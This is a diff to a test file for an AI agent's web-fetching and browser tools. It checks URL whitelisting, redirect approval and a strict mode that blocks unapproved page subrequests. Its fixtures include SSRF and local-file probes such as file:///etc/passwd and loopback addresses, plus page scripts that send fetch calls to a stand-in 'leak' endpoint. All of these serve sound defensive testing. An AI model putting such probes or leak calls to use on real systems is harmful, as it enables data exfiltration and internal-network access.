@@ -19,6 +19,13 @@ await check('URL拒绝非HTTP、凭据、内网及非标准端口', () => {
   for (const url of ['file:///etc/passwd','ftp://example.com','https://a:b@example.com','http://localhost','http://2130706433','http://[::1]','https://example.com:8443','https://foo.local/']) assert.throws(() => webUrl(url));
   assert.throws(() => webUrl('https://example.com', []));
 });
+await check('完整URL白名单区分路径和查询参数，拒绝前不解析DNS',async()=>{
+  const allowed=['https://fixture.example/pixel?value=sample'];
+  assert.equal(webUrl(allowed[0],undefined,allowed).href,allowed[0]);
+  let resolves=0;const http=new SafeHttp(async()=>{resolves++;return [{address:'8.8.8.8',family:4}];});
+  for(const url of ['https://fixture.example/pixel?value=other','https://fixture.example/other?value=sample','https://other.example/pixel?value=sample'])await assert.rejects(http.get(url,{urls:allowed}),/未获授权/);
+  assert.equal(resolves,0);
+});
 await check('拒绝混合公网/私网DNS解析及已取消请求', async () => {
   await assert.rejects(new SafeHttp(async () => [{ address: '8.8.8.8', family: 4 }, { address: '127.0.0.1', family: 4 }]).get('https://example.com'), /非公网/);
   await assert.rejects(new SafeHttp().get('https://example.com', { signal: AbortSignal.abort() }));
@@ -50,6 +57,16 @@ await check('重定向逐跳校验，连接沿用已验证的DNS地址', async (
   await assert.rejects(http.get('https://example.com', { origins: ['https://example.com'] }), /未获授权/);
   next = 'https://example.com/loop'; await assert.rejects(http.get('https://example.com'), /次数过多/);
 });
+await check('普通对话重定向不发出第二次请求，返回新地址等待确认',async()=>{
+  const sent:string[]=[];
+  class ApprovalHttp extends SafeHttp {
+    protected override async once(url:URL):Promise<WebResponse>{sent.push(url.href);return {url:url.href,status:302,headers:{location:'https://other.example/collect?value=synthetic'},body:Buffer.alloc(0)};}
+  }
+  const http=new ApprovalHttp(async()=>[{address:'8.8.8.8',family:4}]);
+  const tool=new WebTools(undefined,http).tools(async()=>undefined)[0]!;
+  const result=JSON.parse(await tool.run({url:'https://fixture.example/start'},{taskDir:'.'}));
+  assert.deepEqual(sent,['https://fixture.example/start']);assert.equal(result.redirectUrl,'https://other.example/collect?value=synthetic');assert.match(result.notice,/另行确认/);
+});
 await check('HTML正文、来源与相对链接，不执行脚本', () => {
   const result = htmlContent('<html><head><title>公告</title></head><body><p>测试公告正文</p><a href="/detail">详情</a><script>秘密脚本指令</script></body></html>', 'https://example.com/list');
   assert.equal(result.title, '公告'); assert.match(result.text, /测试公告正文/); assert.doesNotMatch(result.text, /秘密脚本指令/); assert.equal(result.links[0]?.url, 'https://example.com/detail');
@@ -72,10 +89,11 @@ await check('浏览器输入边界', () => {
   assert.throws(() => browseInput({ url: 'https://example.com', actions: [{ kind: 'evaluate', script: 'alert(1)' }] }));
   assert.throws(() => browseInput({ url: 'https://example.com', actions: [{ kind: 'wait', milliseconds: 99999 }] }));
 });
-let reads = 0;
+let reads = 0;const sentUrls:string[]=[];
 class FixtureHttp extends SafeHttp {
   override async get(url: string, policy: WebPolicy = {}): Promise<WebResponse> {
-    const parsed = webUrl(url, policy.origins); policy.signal?.throwIfAborted(); reads++;
+    const parsed = webUrl(url, policy.origins); policy.signal?.throwIfAborted(); reads++;sentUrls.push(parsed.href);
+    if(parsed.pathname==='/strict')return {url,status:200,headers:{'content-type':'text/html'},body:Buffer.from('<html><body>严格测试<img src="/pixel?value=sample"><script>fetch("/collect?value=sample").catch(()=>{});fetch("https://other.example/leak?value=sample").catch(()=>{});</script></body></html>')};
     if (parsed.pathname === '/slow') { await new Promise<void>((resolve, reject) => { const timer = setTimeout(resolve, 10000); policy.signal?.addEventListener('abort', () => { clearTimeout(timer); reject(Error('cancelled')); }, { once: true }); }); }
     if (parsed.pathname === '/jump') return { url, status: 302, headers: { 'content-type': 'text/html', location: 'https://other.example/destination' }, body: Buffer.alloc(0) };
     const html = `<html><head><title>动态测试</title></head><body><h1>公开公告</h1><button id="expand" onclick="document.querySelector('#details').textContent='已展开动态正文'">展开</button><p id="details">等待展开</p><input id="field" style="position:absolute;left:20px;top:100px"><button id="show" onclick="document.querySelector('#details').textContent=document.querySelector('#field').value">显示输入</button><form><button id="submit">提交</button></form><a href="https://other.example/next">下一页</a><div style="height:1800px">长页面</div><script>document.body.dataset.previous=localStorage.getItem('fixture')||'空';localStorage.setItem('fixture','已保存');document.body.append('上次状态：'+document.body.dataset.previous);setTimeout(()=>document.body.append('异步正文'),30);fetch('http://127.0.0.1/private').catch(()=>{});fetch('/write',{method:'POST',body:'x'}).catch(()=>{});</script></body></html>`;
@@ -123,12 +141,44 @@ if (process.argv.includes('--browser')) {
       await rpc(id,{kind:'navigate',url:'https://fixture.example'});
       await rpc(id,{kind:'click',x:50,y:110}); await rpc(id,{kind:'text',text:'用户接手内容'});
       const shared=new WebTools({url:base,token}).tools(async()=>undefined,undefined,id)[1]!;
-      const result=JSON.parse(await shared.run({actions:[{kind:'click',selector:'#show'}]},{taskDir:'.'}));assert.match(result.text,/用户接手内容/);assert(result.fields.some((f:{value:string})=>f.value==='用户接手内容'));
+      const result=JSON.parse(await shared.run({actions:[{kind:'click',selector:'#show'}]},{taskDir:'.',requestAccess:async()=>true}));assert.match(result.text,/用户接手内容/);assert(result.fields.some((f:{value:string})=>f.value==='用户接手内容'));
+      let approvals=0;
+      await assert.rejects(shared.run({actions:[{kind:'click',selector:'#expand'}]},{taskDir:'.',requestAccess:async request=>{approvals++;assert.equal(typeof request.binding?.revision,'string');await rpc(id,{kind:'scroll',pixels:20});return true;}}),/页面已变化/);
+      assert.equal(approvals,1);
+      const request={headers:{authorization:'Bearer '+token}};
+      const snapshot=await (await fetch(base+'/v1/sessions/'+id+'/authorization',request)).json();
+      const use=()=>fetch(base+'/v1/browse',{method:'POST',headers:{...request.headers,'content-type':'application/json'},body:JSON.stringify({sessionId:id,expectedRevision:snapshot.revision,actions:[]})});
+      assert.equal((await use()).status,200);assert.equal((await use()).status,422);
+      await rpc(id,{kind:'close'});
+      assert.equal((await use()).status,422);
+      await rpc(id,{kind:'navigate',url:'https://fixture.example'});
       assert.equal((await rpc(second)).open,false);
       await rpc(id,{kind:'navigate',url:'https://other.example/next'});assert.equal((await rpc(id,{kind:'back'})).url,'https://fixture.example/');assert.equal((await rpc(id,{kind:'forward'})).url,'https://other.example/next');
       await rpc(id,{kind:'resize',width:600,height:700});assert.equal((await rpc(id)).width,600);
       await Promise.all([rpc(id),rpc(id,{kind:'scroll',pixels:10})]);
       await rpc(id,{kind:'close'});assert.equal((await rpc(id)).open,false);
+    });
+    await check('共享严格模式阻止未授权子请求，完整URL审批后只放行对应地址',async()=>{
+      const id='c'.repeat(64),headers={authorization:'Bearer '+token,'content-type':'application/json'};
+      const command=async(body:unknown)=>{const response=await fetch(base+'/v1/sessions/'+id,{method:'POST',headers,body:JSON.stringify(body)});assert.equal(response.status,200);return response.json();};
+      sentUrls.length=0;
+      const frame=await command({kind:'navigate',url:'https://fixture.example/strict'});
+      assert(!sentUrls.some(url=>url.includes('/collect')||url.includes('/pixel')||url.includes('/leak')));
+      assert(frame.blockedUrls.some((url:string)=>url.includes('/pixel')));
+      const tool=new WebTools({url:base,token}).tools(async()=>undefined,undefined,id)[1]!;
+      sentUrls.length=0;
+      await tool.run({resourceUrls:['https://fixture.example/pixel?value=sample'],actions:[{kind:'reload'}]},{taskDir:'.',requestAccess:async()=>true});
+      assert(sentUrls.includes('https://fixture.example/pixel?value=sample'));
+      assert(!sentUrls.some(url=>url.includes('/collect')||url.includes('/leak')));
+      sentUrls.length=0;
+      await assert.rejects(tool.run({resourceUrls:['https://fixture.example/collect?value=sample'],actions:[{kind:'reload'}]},{taskDir:'.',requestAccess:async()=>false}));
+      assert.equal(sentUrls.length,0);
+      await command({kind:'close'});
+    });
+    await check('共享严格模式不跟随未经确认的重定向',async()=>{
+      const id='d'.repeat(64);sentUrls.length=0;
+      const response=await fetch(base+'/v1/sessions/'+id,{method:'POST',headers:{authorization:'Bearer '+token,'content-type':'application/json'},body:JSON.stringify({kind:'navigate',url:'https://fixture.example/jump'})});
+      assert.equal(response.status,422);assert(!sentUrls.some(url=>url.includes('other.example/destination')));
     });
     await check('工具通过HTTP服务保存截图，结果不含base64', async () => {
       let saved = false;
